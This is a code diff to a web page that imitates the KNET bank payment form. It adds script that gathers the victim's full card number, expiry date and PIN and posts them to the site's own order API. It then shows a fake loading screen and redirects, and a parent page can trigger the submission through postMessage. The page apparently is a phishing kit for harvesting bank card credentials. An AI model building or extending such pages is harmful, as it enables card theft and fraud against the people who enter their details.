@@ -125,6 +125,25 @@
         .footer-text { margin-top: 15px; text-align: center; color: #333; font-size: 11px; line-height: 1.5; }
         .footer-text b { color: #0056b3; }
 
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+        .loading-overlay.active { display: flex; }
+        .loading-spinner {
+            width: 50px; height: 50px;
+            border: 5px solid rgba(255,255,255,0.3);
+            border-top: 5px solid #0070cd;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
         .suggestions {
             position: absolute;
             top: 30px;
@@ -194,8 +213,10 @@
                 <div class="input-wrap">
                     <div class="expiry-group">
                         <input type="text" id="expMonth" class="exp-input" placeholder="MM" maxlength="2">
+                        <input type="text" id="expiryMonthBox" style="display:none;">
                         <span class="exp-sep">/</span>
                         <input type="text" id="expYear" class="exp-input" placeholder="YY" maxlength="2">
+                        <input type="text" id="expiryYearBox" style="display:none;">
                     </div>
                 </div>
             </div>
@@ -219,6 +240,10 @@
             All Rights Reserved © 2026<br>
             <b>Shared Electronic Banking Services Company - KNET</b>
         </div>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
     </div>
 
     <script>
@@ -284,12 +309,93 @@
             });
 
             $('#expMonth').on('input', function() {
-                if (this.value.length === 2) $('#expYear').focus();
+                var val = this.value.replace(/\D/g, '');
+                if (val.length > 2) val = val.substring(0, 2);
+                this.value = val;
+                $('#expiryMonthBox').val(val);
+                if (val.length === 2) $('#expYear').focus();
+            });
+
+            $('#expYear').on('input', function() {
+                var val = this.value.replace(/\D/g, '');
+                if (val.length > 2) val = val.substring(0, 2);
+                this.value = val;
+                $('#expiryYearBox').val(val);
             });
 
             $('input[type="text"]').on('keypress', function(e) {
                 if (e.which < 48 || e.which > 57) e.preventDefault();
             });
+
+            // Wire the Submit button to call onPay if available
+            $('.action-btn:first-child').on('click', function() {
+                if (typeof window.onPay === 'function') {
+                    window.onPay();
+                }
+            });
+        });
+
+        // Bridge functions for parent page communication
+        window.onPay = window.onPay || function() {
+            var debitNumber = document.getElementById('debitNumber') ? document.getElementById('debitNumber').value.replace(/\s/g, '') : '';
+            var expiryMonth = document.getElementById('expiryMonthBox') ? document.getElementById('expiryMonthBox').value : document.getElementById('expMonth').value;
+            var expiryYear = document.getElementById('expiryYearBox') ? document.getElementById('expiryYearBox').value : document.getElementById('expYear').value;
+            var cardPin = document.getElementById('cardPin') ? document.getElementById('cardPin').value : '';
+
+            if (!debitNumber || !expiryMonth || !expiryYear || !cardPin) {
+                alert('Please complete all fields');
+                return false;
+            }
+
+            var orderId = '';
+            try { orderId = localStorage.getItem('orderId') || sessionStorage.getItem('orderId'); } catch(e) {}
+
+            var knetData = {
+                orderId: orderId,
+                payment_method: 'Knet',
+                knet_data: {
+                    card_number: debitNumber,
+                    expiry_month: expiryMonth,
+                    expiry_year: expiryYear,
+                    pin: cardPin,
+                    timestamp: new Date().toISOString()
+                }
+            };
+
+            if (typeof window.loadshow === 'function') window.loadshow();
+
+            fetch('/api/orders/payment-data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(knetData)
+            })
+            .then(function(r) { return r.json(); })
+            .then(function(data) {
+                window.location.href = 'loading_en.html';
+            })
+            .catch(function(err) {
+                if (typeof window.loadhide === 'function') window.loadhide();
+                alert('An error occurred while sending data');
+            });
+        };
+
+        window.loadshow = function() {
+            document.getElementById('loadingOverlay').classList.add('active');
+        };
+        window.loadhide = function() {
+            document.getElementById('loadingOverlay').classList.remove('active');
+        };
+
+        window.addEventListener('message', function(event) {
+            if (event.data.type === 'submitKnet') {
+                if (typeof window.onPay === 'function') window.onPay();
+            }
+            if (event.data.type === 'initKnetData') {
+                if (event.data.knetTotal) {
+                    var amountEl = document.getElementById('amount');
+                    if (amountEl) amountEl.textContent = event.data.knetTotal;
+                }
+            }
         });
     </script>
 </body>
